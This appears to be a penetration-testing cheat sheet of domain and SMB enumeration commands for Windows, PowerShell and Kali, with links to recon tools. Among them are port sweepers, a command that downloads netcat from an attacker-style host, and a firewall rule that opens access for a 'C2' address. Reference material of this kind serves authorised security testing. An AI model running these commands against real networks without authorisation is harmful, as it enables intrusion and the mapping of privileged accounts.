# Domain Enumeration

## Command Tools (cmd.exe)

A simple batch script with these commands is here: [\tools\WinDomainEnum.bat](https://github.com/EvolvingSysadmin/Penetration-Testing/blob/master/tools/WinDomainEnum.bat)

Display Networking Info
```CMD
ipconfig /all
```
Display Domain
```CMD
echo %USERDOMAIN%
    net config workstation/server
```
Display Domain Logon Server
```CMD
echo %logonserver%
```
Display Domain Password Policy
```CMD
net accounts /domain
```
Display DC Address, Domain Name, Roles
```CMD
wmic ntdomain
```
Display All Domain Users
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
```
Display All Domain Groups
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
```
Display All Domain Computers
```CMD
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
```
View Domain User Info
```CMD
net user /domain
 net user pentestuser /domain
```
Display Domain Admin Users
```CMD
net group “Domain Admins” /domain
```
View All Hosts in Domain/Workgroup
```CMD
net view
```
Display Network Shares
```CMD
net share
```
Display Domain Trust Info
```CMD
nltest
 nltest /finduser:sweppler
 nltest /dclist:mydomain
 nltest /trusted_domains
```

## PowerShell Tools

Ping Sweeper
```PowerShell
 1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_ | Select-String ttl}
```
Port Sweeper
```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<IPADDR>", $_)) "Port $_ is open!"} 2>$null
```
Sweep Range of IPs for Single Port
```PowerShell
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}
```
Sweep IPs and Ports
```PowerShell
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
```
Test Egress Filtering
```PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open" } 2>$null
```
Display Domain Admins
```PowerShell
([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
```
Web Client to Download Files (eg NetCat)
```PowerShell
wget "http://10.10.10.10/nc.exe" -outfile "c:\nc.exe"
```
Get Firewall Rules
```PowerShell
Get-NetFirewallRule -all | Out-GridView
 Get-NetFirewallRule -all | Export-csv <file_path.csv>
```
Add Firewall Rule
```PowerShell
New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress <IPADDR>
```

 ## Linux/Kali Tools

 SMB Enumeration Tools
 ```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```bash
nbtscan 192.168.1.0/24
```

Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```bash
enum4linux -a target-ip
```

Fingerprint SMB Version
```bash
smbclient -L //192.168.1.100 
```

Find open SMB Shares in Nmap
```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

Enumerate SMB Users in Nmap
```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```


Enumerate SMB Using Samrdump Python Impacket

```bash
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```


ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
https://github.com/trustedsec/ridenum


Metasploit RID Cycling

```bash
use auxiliary/scanner/smb/smb_lookupsid
```

https://github.com/SecureAuthCorp/impacket

https://www.hackingarticles.in/impacket-guide-smb-msrpc/

 https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

## Domain Enumeration Resources

* Information dumper via LDAP: https://github.com/dirkjanm/ldapdomaindump
* Integrated DNS dumping by any authenticated user: https://github.com/dirkjanm/adidnsdump
* Advanced Discovery of Privileged Accounts: https://github.com/cyberark/ACLight
* Detailed Active Directory Recon Tool: https://github.com/sense-of-security/ADRecon
* Powershell AD Enumeration: https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf
* Data collector tool: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html